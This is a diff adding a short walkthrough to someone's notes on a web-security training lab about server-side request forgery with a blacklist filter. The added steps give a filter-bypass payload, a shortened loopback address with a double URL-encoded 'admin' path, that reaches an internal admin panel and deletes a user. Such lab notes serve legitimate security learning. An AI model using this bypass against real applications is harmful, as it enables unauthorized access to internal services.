@@ -17,3 +17,13 @@
 5. carlos is deleted, remove the appended location after deleting carlos i.e. admin/delete?username=carlos and send the request
 
 -----------------------------------------------------------------------------------------
+
+#3 Lab: SSRF with blacklist-based input filter
+
+1.check stock of any prodyct and replace stockid with :- http://192.168.0.1:8080/admin (observe that it's blocked)
+2.send to repeater after turning on intercept:- http://127.1/%25%36%31dmin  (double url encode "a" in admin)
+3. check response in repater(html) where location of carlos is given
+4. append /delete?username=carlos and send the request then again by removing the appended location
+5. carlos is deleted
+
+-----------------------------------------------------------------------------------------
